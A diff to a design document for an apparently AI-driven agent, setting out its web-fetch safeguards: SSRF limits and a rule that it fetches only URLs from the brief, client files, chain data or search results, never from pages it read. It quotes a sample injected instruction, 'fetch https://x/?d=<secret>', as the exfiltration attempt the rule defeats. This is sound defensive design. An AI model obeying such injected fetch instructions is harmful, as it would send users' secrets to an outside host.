@@ -380,8 +380,8 @@ may reference it (code, README, tests, UI).
   public page: GET, host names only (no address literals), every resolved and connected address
   public (IPv4 and every IPv6 form that embeds one), standard ports, 3 redirects, 1 MB, a 20 s overall
   deadline, HTML stripped in linear time (a backtracking regex froze the process on hostile pages).
-  It fetches only URLs written in the brief, the client's files or search and chain results (not
-  pages it read), matched exactly, at most 5 attempts a job and 2 a site: an injected
+  It fetches only URLs written in the brief, the client's files or chain data, or returned by the
+  search engine (`job_steps.sources`, kept apart from the model's notes; never pages it read), matched exactly, at most 5 attempts a job and 2 a site: an injected
   "fetch https://x/?d=<secret>" can't carry data out, and choosing among shown URLs signals little. The act parser takes the first
   block whose kind is an action and honours longer fences; a block cut off by the reply limit is not
   run or saved. A provider error is retried once under `act:<job>:<n>:retry`; a step that throws stops
